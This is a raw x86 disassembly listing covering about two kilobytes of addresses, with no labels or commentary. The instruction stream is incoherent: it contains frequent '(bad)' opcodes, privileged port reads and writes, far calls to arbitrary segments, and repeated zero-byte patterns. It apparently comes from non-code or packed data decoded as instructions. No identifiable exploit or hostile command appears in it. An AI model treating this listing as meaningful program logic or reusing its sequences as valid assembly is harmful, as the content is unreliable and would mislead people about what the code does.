  422fdb:	mov    ds:0x585f69b,eax
  422fe0:	in     eax,0xd4
  422fe2:	xchg   BYTE PTR [ebx],ch
  422fe4:	call   0x83d675d2
  422fe9:	mov    ds:0xe524534b,eax
  422fee:	imul   ebx,eax,0x3a
  422ff1:	test   eax,0x794c01f8
  422ff6:	or     BYTE PTR [edi+esi*1+0x42],bh
  422ffa:	pop    ecx
  422ffb:	shr    ebx,0x27
  422ffe:	iret   
  422fff:	adc    al,0xa2
  423001:	cmp    ecx,eax
  423003:	mov    WORD PTR [edi-0x69],ss
  423006:	shr    DWORD PTR [esi+0x55],0x8a
  42300a:	out    0xda,al
  42300c:	inc    ebp
  42300d:	fistp  QWORD PTR [ebp+esi*8-0x61c52e65]
  423014:	jg     0x42302e
  423016:	adc    cl,BYTE PTR [edi+0x5e53d083]
  42301c:	add    BYTE PTR [eax],al
  42301e:	add    BYTE PTR [eax],al
  423020:	add    BYTE PTR [eax],al
  423022:	push   ds
  423023:	test   eax,0x7ff735f6
  423028:	fild   QWORD PTR [ebx-0x5f9ed871]
  42302e:	mov    bl,0x6e
  423030:	ins    DWORD PTR es:[edi],dx
  423031:	jae    0x422fb4
  423033:	aad    0x1
  423035:	add    BYTE PTR [edx+0x0],ah
  423038:	add    BYTE PTR [eax],al
  42303a:	pop    ecx
  42303b:	and    eax,0x6d3c0141
  423040:	sbb    al,0xcb
  423042:	push   ds
  423043:	mov    ebp,0x374cb4bd
  423048:	dec    ebp
  423049:	inc    esi
  42304a:	inc    edx
  42304b:	aas    
  42304c:	push   eax
  42304d:	repnz mov dl,0xe7
  423050:	mov    al,ds:0x30e40290
  423055:	fwait
  423056:	cmp    BYTE PTR [edi],0xce
  423059:	cmp    al,0xfa
  42305b:	or     eax,0x3778fb7c
  423060:	and    DWORD PTR [esi],ebp
  423062:	stos   BYTE PTR es:[edi],al
  423063:	mov    bh,0x24
  423065:	jmp    0x3f9d01db
  42306a:	faddp  st(4),st
  42306c:	and    al,0x7b
  42306e:	(bad)  
  42306f:	enter  0x6d4a,0x5c
  423073:	cmp    eax,0x8f11919e
  423078:	push   ebp
  423079:	jmp    0x42305f
  42307b:	mov    edi,0x817114ae
  423080:	mov    esi,0xb6bd551a
  423085:	hlt    
  423086:	popaw  
  423088:	sbb    ch,al
  42308a:	shl    DWORD PTR [eax+0x1b],0xbc
  42308e:	add    al,0x30
  423090:	imul   ebp,DWORD PTR [edx],0xffffffb0
  423093:	mov    ebx,ecx
  423095:	dec    ebp
  423096:	dec    esi
  423097:	test   eax,0x9112309f
  42309c:	add    BYTE PTR [eax],al
  42309e:	add    BYTE PTR [eax],al
  4230a0:	add    BYTE PTR [eax],al
  4230a2:	fwait
  4230a3:	loope  0x423112
  4230a5:	sub    eax,0xf7dbad7f
  4230aa:	sar    BYTE PTR [ebx],cl
  4230ac:	(bad)  
  4230ad:	add    bl,bl
  4230af:	cmp    al,0x37
  4230b1:	icebp  
  4230b2:	jecxz  0x423089
  4230b4:	add    DWORD PTR [eax],eax
  4230b6:	bound  eax,QWORD PTR [eax]
  4230b8:	add    BYTE PTR [eax],al
  4230ba:	sub    DWORD PTR [edx+0x74],eax
  4230bd:	mov    al,ds:0x57d9eb07
  4230c2:	in     al,0x48
  4230c4:	fstp   QWORD PTR [edx-0x7b]
  4230c7:	push   ecx
  4230c8:	retf   
  4230c9:	mov    eax,0x5424a19e
  4230ce:	das    
  4230cf:	xor    eax,0x16987060
  4230d4:	add    ebx,DWORD PTR [eax*1-0x333e4bed]
  4230db:	sbb    ah,bh
  4230dd:	push   eax
  4230de:	jbe    0x4230e6
  4230e0:	or     dh,ch
  4230e2:	add    BYTE PTR [edx+0x12],bl
  4230e5:	inc    esp
  4230e6:	ds sub al,0xba
  4230e9:	fbld   TBYTE PTR [edx]
  4230eb:	test   DWORD PTR [edi+0x6e],ebp
  4230ee:	sbb    BYTE PTR [esi],bl
  4230f0:	mov    ebp,0x2c54aaaa
  4230f5:	retf   0x843d
  4230f8:	or     ch,0xb9
  4230fb:	xchg   ebp,eax
  4230fc:	xor    ecx,DWORD PTR [esi+0x3319896b]
  423102:	xchg   esp,eax
  423103:	xchg   DWORD PTR [edi-0x3297f88b],ebx
  423109:	lods   al,BYTE PTR ds:[esi]
  42310a:	pop    esi
  42310b:	jl     0x4230d3
  42310d:	dec    edx
  42310e:	mov    bh,dl
  423110:	aam    0x63
  423112:	into   
  423113:	pop    es
  423114:	add    BYTE PTR [edi+0x1fa34a61],dl
  42311a:	inc    ebx
  42311b:	cmp    eax,DWORD PTR [eax]
  42311d:	add    BYTE PTR [eax],al
  42311f:	add    BYTE PTR [eax],al
  423121:	add    BYTE PTR [eax],cl
  423123:	div    DWORD PTR [edi+0x4a]
  423126:	dec    edx
  423128:	cmp    eax,0x2e8eedf7
  42312d:	dec    eax
  42312e:	inc    ebp
  42312f:	pop    ebx
  423130:	out    0xdf,al
  423132:	inc    ebp
  423133:	(bad)  
  423134:	add    DWORD PTR [eax],eax
  423136:	bound  eax,QWORD PTR [eax]
  423138:	add    BYTE PTR [eax],al
  42313a:	stc    
  42313b:	(bad)  
  42313c:	jl     0x423188
  42313e:	hlt    
  42313f:	cld    
  423140:	mov    eax,ds:0xa377f85a
  423145:	pop    ecx
  423146:	shl    BYTE PTR [edx+edx*2-0x66],1
  42314a:	jb     0x42310e
  42314c:	mov    al,ds:0x21652f53
  423151:	mov    dl,0xff
  423153:	std    
  423154:	sbb    ch,ch
  423156:	or     eax,0x1b7aaa8a
  42315b:	or     DWORD PTR [esi-0x740b9ae1],eax
  423161:	adc    cl,bl
  423163:	mov    ebx,0x6145edc8
  423168:	push   esp
  423169:	lahf   
  42316a:	push   cs
  42316b:	pushf  
  42316c:	inc    eax
  42316d:	jg     0x4231a1
  42316f:	dec    esp
  423170:	jl     0x4231d7
  423172:	div    BYTE PTR [ecx+0x46]
  423175:	fidivr DWORD PTR [eax-0x21880320]
  42317b:	int3   
  42317c:	ds mov ecx,DWORD PTR es:[esi-0x36]
  423181:	scas   eax,DWORD PTR es:[edi]
  423182:	jbe    0x42315d
  423184:	inc    edx
  423185:	imul   dl
  423187:	xor    dx,WORD PTR ds:0x2513979f
  42318e:	popf   
  42318f:	inc    esp
  423190:	rcr    BYTE PTR [ebx],1
  423192:	push   eax
  423193:	les    edx,FWORD PTR [edx+0x31]
  423196:	shr    BYTE PTR [edi-0x72],0xf2
  42319a:	(bad)  
  42319b:	in     eax,dx
  42319c:	add    BYTE PTR [eax],al
  42319e:	add    BYTE PTR [eax],al
  4231a0:	add    BYTE PTR [eax],al
  4231a2:	arpl   WORD PTR ss:[eax-0x10],bp
  4231a6:	jge    0x4231a3
  4231a8:	mov    esi,0x8c7853e7
  4231ad:	daa    
  4231ae:	loopne 0x42313e
  4231b0:	push   cs
  4231b1:	add    ah,BYTE PTR [edi+0x620001d6]
  4231b7:	add    BYTE PTR [eax],al
  4231b9:	add    BYTE PTR [eax-0x75b859d7],ch
  4231bf:	stos   DWORD PTR es:[edi],eax
  4231c0:	mov    ?,WORD PTR [edi-0x3f]
  4231c3:	mov    esp,0x694e2baa
  4231c8:	and    edx,DWORD PTR [edx]
  4231ca:	jg     0x4231b9
  4231cc:	inc    esp
  4231cd:	adc    DWORD PTR [edi-0x564aabad],edx
  4231d3:	in     al,0xc
  4231d5:	add    ebp,DWORD PTR [edi-0x35a4e1fe]
  4231db:	mov    ch,BYTE PTR [esi+0x79]
  4231de:	or     eax,ecx
  4231e0:	imul   ebx,DWORD PTR [edi+0x2c4e09d6],0x2d6fd16f
  4231ea:	cs push ebx
  4231ec:	ja     0x423172
  4231ee:	stos   DWORD PTR es:[edi],eax
  4231ef:	int    0x9a
  4231f1:	sub    DWORD PTR ds:0xeb20b737,0xffffffaa
  4231f8:	in     eax,0x6
  4231fa:	push   esi
  4231fb:	push   esp
  4231fc:	cmc    
  4231fd:	mov    dh,0x49
  4231ff:	push   edi
  423200:	adc    ecx,DWORD PTR [edi+0x64e0ba15]
  423206:	push   esi
  423207:	dec    esp
  423208:	add    edi,ebx
  42320a:	inc    eax
  42320b:	(bad)  
  42320c:	retf   0xefb5
  42320f:	daa    
  423210:	ret    
  423211:	mov    ecx,0x19b555ac
  423216:	lods   eax,DWORD PTR ds:[esi]
  423217:	jmp    0x4231b9
  423219:	cld    
  42321a:	adc    al,0x12
  42321c:	add    BYTE PTR [eax],al
  42321e:	add    BYTE PTR [eax],al
  423220:	add    BYTE PTR [eax],al
  423222:	daa    
  423223:	ss lahf 
  423225:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42322b:	and    eax,0xbd75075b
  423230:	dec    edx
  423231:	adc    ecx,DWORD PTR [edi-0x22]
  423234:	add    DWORD PTR [eax],eax
  423236:	bound  eax,QWORD PTR [eax]
  423238:	add    BYTE PTR [eax],al
  42323a:	jnp    0x42328d
  42323c:	shl    DWORD PTR [ebx-0x4d3ccf36],cl
  423242:	mov    edi,fs
  423244:	lock clc 
  423246:	jg     0x4232ad
  423248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423249:	bound  ebx,QWORD PTR [ebx-0xce2450d]
  42324f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423250:	push   es
  423251:	mov    ds,esp
  423253:	dec    edx
  423254:	or     BYTE PTR [eax],cl
  423256:	cmc    
  423257:	mov    dh,0x12
  423259:	mov    eax,0xa4abe65b
  42325e:	mov    al,ds:0x70159f2f
  423263:	push   edi
  423264:	sar    BYTE PTR [ecx],1
  423266:	or     bh,BYTE PTR [esi-0x57e62060]
  42326c:	cmp    DWORD PTR [ebp+0x35],esi
  42326f:	fs stos BYTE PTR es:[edi],al
  423271:	inc    edi
  423272:	pop    ebx
  423273:	sbb    ecx,DWORD PTR [ebp-0x14fd8f2d]
  423279:	retf   0xce13
  42327c:	int    0xfc
  42327e:	ss mov esp,0x14c4a15e
  423284:	(bad)  
  423285:	aas    
  423286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423287:	fucomi st,st(2)
  423289:	(bad)  
  42328a:	mov    cs,WORD PTR [eax-0x7a55d67]
  423290:	cmp    ecx,edx
  423292:	nop
  423293:	je     0x423218
  423295:	inc    ebp
  423296:	jle    0x42330d
  423298:	push   esp
  423299:	push   esi
  42329a:	sbb    BYTE PTR [edx+0x0],al
  42329d:	add    BYTE PTR [eax],al
  42329f:	add    BYTE PTR [eax],al
  4232a1:	add    BYTE PTR [edi],dh
  4232a3:	(bad)  
  4232a4:	out    0xc2,eax
  4232a6:	mul    ebx
  4232a8:	aaa    
  4232a9:	cmc    
  4232aa:	xchg   ecx,eax
  4232ab:	call   0xc629:0xe9e5eef4
  4232b2:	mov    cl,0xde
  4232b4:	add    DWORD PTR [eax],eax
  4232b6:	bound  eax,QWORD PTR [eax]
  4232b8:	add    BYTE PTR [eax],al
  4232ba:	add    al,0xdf
  4232bc:	jnp    0x4232bc
  4232be:	mov    al,0x1e
  4232c0:	ret    
  4232c1:	(bad)  
  4232c2:	into   
  4232c3:	push   ecx
  4232c4:	rcr    BYTE PTR [eax+edx*4],cl
  4232c7:	cmpxchg DWORD PTR ds:0xf40298d8,edx
  4232ce:	mov    ebp,0xc71918c9
  4232d3:	push   esp
  4232d4:	cmp    eax,0x1c730b70
  4232d9:	jmp    0x423307
  4232db:	fs sbb BYTE PTR cs:[ecx],bh
  4232df:	ret    0x2727
  4232e2:	or     eax,0x7c55e899
  4232e7:	pop    ecx
  4232e8:	pop    edx
  4232e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232ea:	add    eax,0xcfa3d684
  4232ef:	aaa    
  4232f0:	arpl   WORD PTR [edx+0x4f],ax
  4232f3:	mov    al,0x27
  4232f5:	push   esp
  4232f6:	dec    eax
  4232f7:	aas    
  4232f8:	or     esp,eax
  4232fa:	fidivr WORD PTR [edx+0x77]
  4232fd:	xchg   ebp,eax
  4232fe:	lods   eax,DWORD PTR ds:[esi]
  4232ff:	call   0x3d6ae89f
  423304:	jp     0x42331e
  423306:	dec    ebx
  423307:	mov    bl,0xd9
  423309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42330a:	push   0xef051a6a
  42330f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423310:	jl     0x42332a
  423312:	pop    es
  423313:	inc    ebx
  423314:	dec    esi
  423316:	push   DWORD PTR [esi-0x1f55f683]
  42331c:	add    BYTE PTR [eax],al
  42331e:	add    BYTE PTR [eax],al
  423320:	add    BYTE PTR [eax],al
  423322:	push   ss
  423323:	aad    0xdf
  423325:	out    dx,eax
  423326:	fucomip st,st(7)
  423328:	ss std 
  42332a:	cmp    BYTE PTR [esi+0x5a885f3a],al
  423330:	rcl    DWORD PTR [ebx+edx*1],0xdf
  423334:	add    DWORD PTR [eax],eax
  423336:	bound  eax,QWORD PTR [eax]
  423338:	add    BYTE PTR [eax],al
  42333a:	xchg   ebx,eax
  42333b:	call   0x9f69:0x6e32501a
  423342:	fdivr  DWORD PTR [eax+0x11ab83e1]
  423348:	add    eax,0x97110541
  42334d:	sub    edi,ecx
  42334f:	dec    edi
  423350:	js     0x4232e4
  423352:	jns    0x42335c
  423354:	cmp    al,0x28
  423356:	iret   
  423357:	cmp    esp,DWORD PTR [ebx-0x5d]
  42335a:	lock enter 0x1bdc,0x1
  42335f:	add    ebx,DWORD PTR [edi-0x3f15ef9a]
  423365:	jge    0x42332c
  423367:	jae    0x423359
  423369:	test   DWORD PTR [ecx+0x50],edx
  42336c:	xor    bl,0xd7
  42336f:	mov    ebx,0x68af5d8c
  423374:	add    dl,ah
  423376:	mov    dh,0xce
  423378:	and    dh,0xf5
  42337b:	mov    esi,0x9058818d
  423380:	add    bh,cl
  423382:	aam    0x22
  423384:	cmp    BYTE PTR ds:0xe99bc44c,cl
  42338a:	fmulp  st(6),st
  42338c:	push   ebp
  42338d:	fist   WORD PTR [esi]
  42338f:	xchg   edi,eax
  423390:	es push cs
  423392:	fisub  WORD PTR [ebx-0x5b]
  423395:	jp     0x423409
  423397:	int3   
  423398:	mov    bl,0x62
  42339a:	out    dx,al
  42339b:	pop    ds
  42339c:	add    BYTE PTR [eax],al
  42339e:	add    BYTE PTR [eax],al
  4233a0:	add    BYTE PTR [eax],al
  4233a2:	outs   dx,BYTE PTR ds:[esi]
  4233a3:	jbe    0x423389
  4233a5:	retf   0xdafc
  4233a8:	outs   dx,BYTE PTR ds:[esi]
  4233a9:	neg    BYTE PTR [eax]
  4233ab:	xchg   edx,eax
  4233ac:	xchg   DWORD PTR [edi+0x399ae93b],edx
  4233b2:	jne    0x423393
  4233b4:	add    DWORD PTR [eax],eax
  4233b6:	bound  eax,QWORD PTR [eax]
  4233b8:	add    BYTE PTR [eax],al
  4233ba:	out    0x5b,al
  4233bc:	push   0x23b44921
  4233c1:	les    ebp,FWORD PTR [edx-0x6df73eb9]
  4233c7:	sti    
  4233c8:	sub    eax,0xd9fe00bc
  4233cd:	test   al,0x5a
  4233cf:	push   ecx
  4233d0:	(bad)  
  4233d1:	icebp  
  4233d2:	push   ds
  4233d3:	jge    0x4233ec
  4233d5:	xchg   esi,eax
  4233d6:	sub    eax,0x479d147
  4233db:	enter  0xe70,0x80
  4233df:	dec    ecx
  4233e0:	js     0x42339a
  4233e2:	(bad)  
  4233e3:	push   0x3c
  4233e5:	push   ss
  4233e6:	mov    eax,0x89a6d523
  4233eb:	shl    BYTE PTR [edi+0x5759d5af],cl
  4233f1:	sbb    ebp,esp
  4233f3:	sbb    al,0x17
  4233f5:	cld    
  4233f6:	inc    edi
  4233f7:	stos   BYTE PTR es:[edi],al
  4233f8:	inc    DWORD PTR [edi+0x1f2ff0c4]
  4233fe:	mov    ds:0xb76c9137,eax
  423403:	in     eax,dx
  423404:	mov    al,ds:0xabece400
  423409:	sahf   
  42340a:	std    
  42340b:	loope  0x423399
  42340d:	in     eax,0x92
  42340f:	js     0x4233e8
  423411:	enter  0x58f5,0x6b
  423415:	hlt    
  423416:	jbe    0x4233f3
  423418:	push   edi
  423419:	inc    ecx
  42341a:	fwait
  42341b:	push   es
  42341c:	add    BYTE PTR [eax],al
  42341e:	add    BYTE PTR [eax],al
  423420:	add    BYTE PTR [eax],al
  423422:	cmp    dl,BYTE PTR [edx-0x3c]
  423425:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42342c:	nop
  42342d:	shr    DWORD PTR [ecx],cl
  42342f:	test   eax,0xdfd7a48c
  423434:	add    DWORD PTR [eax],eax
  423436:	bound  eax,QWORD PTR [eax]
  423438:	add    BYTE PTR [eax],al
  42343a:	(bad)  
  42343b:	hlt    
  42343c:	push   ebx
  42343d:	imul   edi,DWORD PTR [ecx],0x5584ce71
  423443:	mov    BYTE PTR [ebp+0x50],bl
  423446:	cmp    ebp,ebp
  423448:	cdq    
  423449:	sbb    esp,ebx
  42344b:	sub    al,0xd7
  42344d:	shl    ch,cl
  42344f:	std    
  423450:	xlat   BYTE PTR ds:[ebx]
  423451:	xchg   ecx,eax
  423452:	add    al,0xf5
  423454:	sub    edi,DWORD PTR [ebx]
  423456:	pop    es
  423457:	mov    al,ds:0xd5ae591c
  42345c:	mov    edx,0x900c234d
  423461:	and    BYTE PTR [ebx-0x2e],0x98
  423465:	or     eax,0xa0f7a7d6
  42346a:	or     BYTE PTR [esp+edx*8-0x26eaf312],ch
  423471:	and    eax,0x81500a95
  423476:	dec    esp
  423477:	scas   eax,DWORD PTR es:[edi]
  423478:	(bad)  
  423479:	fisttp WORD PTR [edi-0x64]
  42347c:	mov    DWORD PTR [esi],esi
  42347e:	xchg   ecx,eax
  42347f:	pusha  
  423480:	shl    BYTE PTR [edx-0x525a1be8],0xa3
  423487:	xchg   esp,eax
  423488:	call   0x9427:0x321064a
  42348f:	ffreep st(2)
  423491:	enter  0xfc90,0x4b
  423495:	ins    DWORD PTR es:[edi],dx
  423496:	imul   ebx,DWORD PTR [esi-0x76],0xd06614
  42349d:	add    BYTE PTR [eax],al
  42349f:	add    BYTE PTR [eax],al
  4234a1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234a7:	jle    0x42347c
  4234a9:	call   DWORD PTR [eax-0x20]
  4234ac:	cli    
  4234ad:	call   0xe039:0x16619fcd
  4234b4:	add    DWORD PTR [eax],eax
  4234b6:	bound  eax,QWORD PTR [eax]
  4234b8:	add    BYTE PTR [eax],al
  4234ba:	jo     0x4234fc
  4234bc:	sbb    BYTE PTR [ecx+0x6],bh
  4234bf:	(bad)  
  4234c0:	jge    0x4234da
  4234c2:	push   eax
  4234c3:	mov    ds:0x9af176c4,eax
  4234c8:	in     eax,dx
  4234c9:	out    0xa7,eax
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	test   al,0x9e
  4234ce:	ds es sahf 
  4234d1:	leave  
  4234d2:	shr    DWORD PTR [edi-0x15],1
  4234d5:	data16 xlat BYTE PTR ds:[ebx]
  4234d7:	add    eax,0x3352e51f
  4234dc:	lock (bad) 
  4234df:	ficomp DWORD PTR [edi+0x75e08ce1]
  4234e5:	daa    
  4234e6:	shr    ch,0x56
  4234e9:	in     eax,0x4e
  4234eb:	fadd   DWORD PTR [ecx*2-0x4bf11193]
  4234f2:	cld    
  4234f3:	leave  
  4234f4:	iret   
  4234f5:	inc    ecx
  4234f6:	dec    esp
  4234f7:	fisubr WORD PTR [ebx+0x62]
  4234fa:	(bad)  
  4234fb:	popf   
  4234fc:	mov    ds:0xa4a9ecf1,al
  423501:	pop    edi
  423502:	out    0xdf,eax
  423504:	adc    BYTE PTR [ecx],0xe1
  423507:	ss inc ecx
  423509:	push   ss
  42350a:	jo     0x423553
  42350c:	jmp    0x423509
  42350e:	push   es
  42350f:	jnp    0x423529
  423511:	cld    
  423512:	sub    esp,DWORD PTR [eax]
  423514:	mov    cl,0x8
  423516:	push   ebp
  423517:	mov    dh,0xd5
  423519:	aad    0xa0
  42351b:	push   es
  42351c:	add    BYTE PTR [eax],al
  42351e:	add    BYTE PTR [eax],al
  423520:	add    BYTE PTR [eax],al
  423522:	(bad)  
  423524:	test   eax,0xddffeef7
  42352a:	and    al,0x1
  42352c:	pop    ebp
  42352d:	dec    edi
  42352e:	hlt    
  42352f:	data16 aas 
  423531:	or     eax,0x1e09b
  423536:	bound  eax,QWORD PTR [eax]
  423538:	add    BYTE PTR [eax],al
  42353a:	jns    0x4234bf
  42353c:	pop    esp
  42353d:	mov    al,0x31
  42353f:	rol    DWORD PTR [edi-0x31],0xf2
  423543:	fidivr DWORD PTR [ecx+0x6e]
  423546:	xchg   ebx,eax
  423547:	lods   eax,DWORD PTR ds:[esi]
  423548:	push   esp
  423549:	mov    al,0xcb
  42354b:	pop    ebx
  42354c:	mov    al,ds:0x404aaa7
  423551:	arpl   WORD PTR [eax-0x28],sp
  423554:	and    al,0xa4
  423556:	sub    al,0xaa
  423558:	jo     0x423523
  42355a:	push   cs
  42355b:	jmp    0xcc194e8d
  423560:	daa    
  423561:	shr    BYTE PTR [esp+edi*8-0x36],1
  423565:	jmp    0x4235a0
  423567:	sahf   
  423568:	push   ds
  423569:	or     ah,BYTE PTR [ebp-0x16]
  42356c:	dec    edi
  42356d:	jo     0x4235c2
  42356f:	(bad)  
  423570:	jmp    0x423541
  423572:	ret    0x5d36
  423575:	jp     0x4235e3
  423577:	pushf  
  423578:	add    BYTE PTR [esi+0x79],0x6b
  42357c:	sbb    ch,BYTE PTR [esi+0x4fe1ebf]
  423582:	mov    ch,0x14
  423584:	jnp    0x42355c
  423586:	or     eax,0xa49ba586
  42358b:	pop    ds
  42358c:	mov    ecx,0xc4ce42ad
  423591:	lods   eax,DWORD PTR ds:[esi]
  423592:	stos   BYTE PTR es:[edi],al
  423593:	cdq    
  423594:	sub    esi,eax
  423596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423597:	popa   
  423598:	push   ds
  423599:	jo     0x4235d2
  42359b:	stc    
  42359c:	add    BYTE PTR [eax],al
  42359e:	add    BYTE PTR [eax],al
  4235a0:	add    BYTE PTR [eax],al
  4235a2:	outs   dx,DWORD PTR ds:[esi]
  4235a3:	mov    ds:0x7edd2ad4,al
  4235a8:	jmp    edi
  4235aa:	push   edx
  4235ab:	fcmovu st,st(5)
  4235ad:	in     eax,0xf4
  4235af:	ss push 0xffffffb1
  4235b2:	std    
  4235b3:	loopne 0x4235b6
  4235b5:	add    BYTE PTR [edx+0x0],ah
  4235b8:	add    BYTE PTR [eax],al
  4235ba:	mov    ds:0x4f69b36f,al
  4235bf:	daa    
  4235c0:	lahf   
  4235c1:	and    ah,BYTE PTR [edi-0x3bd0f1ac]
  4235c7:	jne    0x423566
  4235c9:	std    
  4235ca:	xchg   BYTE PTR [edi-0x62],ch
  4235cd:	bound  ebp,QWORD PTR [eax]
  4235cf:	mov    ebx,DWORD PTR [edi+0x5fb4ff44]
  4235d5:	test   esp,0xd19f9249
  4235db:	lds    ebx,FWORD PTR [edi-0x7e]
  4235de:	ss es inc edx
  4235e1:	sbb    al,0x99
  4235e3:	rcl    DWORD PTR [eax-0x6ba6e4],cl
  4235e9:	xor    eax,DWORD PTR [edi+0x47ca5ae5]
  4235ef:	pop    ds
  4235f0:	mov    ch,0x61
  4235f2:	pusha  
  4235f3:	out    0x28,eax
  4235f5:	cdq    
  4235f6:	push   es
  4235f7:	or     ecx,DWORD PTR [edx+edx*2-0x24]
  4235fb:	xor    ah,BYTE PTR [ebp+0x7241028d]
  423601:	xor    BYTE PTR [ebp+0x5d085abf],bl
  423607:	pusha  
  423608:	bound  ecx,QWORD PTR [eax]
  42360a:	or     BYTE PTR [ecx-0x5c],al
  42360d:	jle    0x423647
  42360f:	fwait
  423610:	repnz add al,0x4d
  423613:	je     0x42359a
  423615:	and    DWORD PTR [esi-0x396a9b14],edi
  42361b:	jbe    0x42361d
  42361d:	add    BYTE PTR [eax],al
  42361f:	add    BYTE PTR [eax],al
  423621:	add    cl,bh
  423623:	sbb    al,al
  423625:	inc    esi
  423626:	jecxz  0x423606
  423628:	(bad)  
  423629:	mov    edi,0xe1f1bc83
  42362e:	jns    0x42363d
  423630:	add    DWORD PTR [edi+0x1e15f],edi
  423636:	bound  eax,QWORD PTR [eax]
  423638:	add    BYTE PTR [eax],al
  42363a:	test   BYTE PTR [eax+0x4e832f5f],dl
  423640:	inc    eax
  423641:	inc    ecx
  423642:	addr16 xchg esp,eax
  423644:	aas    
  423645:	bound  edx,QWORD PTR [eax-0x70]
  423648:	or     ah,BYTE PTR [ecx-0x489cfd12]
  42364e:	scas   eax,DWORD PTR es:[edi]
  42364f:	aas    
  423650:	sti    
  423651:	in     al,0x73
  423653:	out    dx,al
  423654:	fdiv   QWORD PTR [ebx+0x188ac1de]
  42365a:	add    DWORD PTR [eax-0x6e],0xffffffcd
  42365e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42365f:	jo     0x423668
  423661:	dec    esi
  423662:	push   ebp
  423663:	pop    eax
  423664:	out    0x6d,al
  423666:	xor    ecx,DWORD PTR [ebx-0x18caa57a]
  42366c:	dec    esp
  42366d:	fwait
  42366e:	(bad)  
  42366f:	into   
  423670:	xchg   ebx,eax
  423671:	dec    esi
  423672:	and    bl,ah
  423674:	xor    DWORD PTR [edx+edi*8+0x2e],eax
  423678:	mov    edx,0xc86b6d9e
  42367d:	xor    ebx,DWORD PTR [eax-0x3e49b32d]
  423683:	push   edi
  423684:	test   eax,0xcbcd82e5
  423689:	add    eax,0x85fa000d
  42368e:	int3   
  42368f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423690:	or     DWORD PTR [eax],0xffffff86
  423693:	mov    ebp,0x603f0c12
  423698:	fwait
  423699:	jmp    0x425611
  42369e:	add    BYTE PTR [eax],al
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	mov    eax,ds:0x3e8336b9
  4236a7:	(bad)  
  4236a8:	mov    ch,0xbb
  4236aa:	icebp  
  4236ab:	and    eax,0xb1038c27
  4236b0:	and    al,0x52
  4236b2:	shl    ecx,0x1
  4236b5:	add    BYTE PTR [edx+0x0],ah
  4236b8:	add    BYTE PTR [eax],al
  4236ba:	mov    eax,ds:0xbfc9246d
  4236bf:	or     edi,DWORD PTR [ecx-0x14338363]
  4236c5:	add    ebx,DWORD PTR [ebp+eiz*1-0x32c1c0f6]
  4236cc:	sub    eax,0x88132f78
  4236d1:	push   esp
  4236d2:	fild   QWORD PTR [ecx]
  4236d4:	bound  ebx,QWORD PTR [ebp-0x2b50b71d]
  4236da:	int    0x6f
  4236dc:	clc    
  4236dd:	mov    ecx,0x1c2428c2
  4236e2:	mov    dh,0x68
  4236e4:	fstp   QWORD PTR [ecx-0x4e]
  4236e7:	cs sahf 
  4236e9:	inc    esp
  4236ea:	(bad)  
  4236eb:	jmp    0x423766
  4236ed:	leave  
  4236ee:	lea    edx,[ebp-0xf]
  4236f1:	jmp    0x9942:0xe16e31f0
  4236f8:	push   ds
  4236f9:	sub    eax,ebp
  4236fb:	mov    dl,0xed
  4236fd:	pusha  
  4236fe:	xchg   esi,eax
  4236ff:	cmp    ebp,ebx
  423701:	sub    al,0x2c
  423703:	mov    edx,0x93414de3
  423708:	mov    DWORD PTR [ecx+0x54],esp
  42370b:	(bad)  
  42370c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42370d:	enter  0xc533,0xd3
  423711:	adc    edx,0x2d
  423714:	retf   0xf3b5
  423717:	pushf  
  423718:	mov    ebp,0x9fa908
  42371d:	add    BYTE PTR [eax],al
  42371f:	add    BYTE PTR [eax],al
  423721:	add    BYTE PTR [edx],dl
  423723:	xlat   BYTE PTR ds:[ebx]
  423724:	repz or esi,edi
  423727:	das    
  423728:	cli    
  423729:	fist   WORD PTR [ecx]
  42372b:	dec    ebx
  42372c:	es nop
  42372e:	adc    eax,esi
  423730:	popa   
  423731:	mov    DWORD PTR [ebx],esp
  423733:	loop   0x423736
  423735:	add    BYTE PTR [edx+0x0],ah
  423738:	add    BYTE PTR [eax],al
  42373a:	(bad)  
  42373c:	lds    edx,FWORD PTR [edx+0x6f1197ac]
  423742:	mul    edx
  423744:	iret   
  423745:	sti    
  423746:	in     eax,dx
  423747:	test   DWORD PTR [edi],0x3656eb83
  42374d:	rol    DWORD PTR [edi],cl
  42374f:	cli    
  423750:	or     eax,0x831c342d
  423755:	jl     0x423754
  423757:	or     DWORD PTR ds:0x25945d97,edx
  42375d:	clc    
  42375e:	xchg   dl,bl
  423760:	in     al,dx
  423761:	push   edx
  423762:	dec    edi
  423763:	sbb    dh,BYTE PTR ds:0xbc57c3de
  423769:	stos   DWORD PTR es:[edi],eax
  42376a:	xchg   edx,eax
  42376b:	or     esi,DWORD PTR [ebx+0x7]
  42376e:	push   cs
  42376f:	jbe    0x423734
  423771:	push   cs
  423772:	push   eax
  423773:	cmp    al,0xe6
  423775:	adc    DWORD PTR [ebp-0x5],edi
  423778:	stc    
  423779:	cmp    bl,BYTE PTR [edi+0x2eaf3d17]
  42377f:	lock xchg esi,eax
  423781:	and    edx,eax
  423783:	mov    WORD PTR [edx+0x68],gs
  423786:	sbb    BYTE PTR [edi-0x5e443895],bl
  42378c:	repz in eax,0x22
  42378f:	out    0xae,eax
  423791:	gs pushf 
  423793:	inc    ebx
  423794:	push   ds
  423795:	call   0xf57f:0xf0e9e9f9
  42379c:	add    BYTE PTR [eax],al
  42379e:	add    BYTE PTR [eax],al
  4237a0:	add    BYTE PTR [eax],al
  4237a2:	adc    bh,BYTE PTR [edx-0x19073928]
  4237a8:	push   ds
  4237a9:	(bad)  
  4237aa:	adc    bl,dh
  4237ac:	cwde   
  4237ad:	out    dx,al
  4237ae:	(bad)  
  4237af:	jge    0x423754
